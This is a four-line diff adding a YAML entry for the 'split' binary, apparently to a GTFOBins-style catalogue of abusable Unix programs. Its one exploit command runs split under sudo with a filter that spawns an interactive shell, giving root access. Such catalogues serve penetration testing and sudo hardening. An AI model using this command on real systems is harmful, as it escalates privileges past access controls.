@@ -1,0 +1,4 @@
+name: split
+binary_path: /usr/bin/split
+exploit_cmds:
+- sudo /usr/bin/split --filter='/bin/sh -i 0<&2 1>&2' /etc/hosts
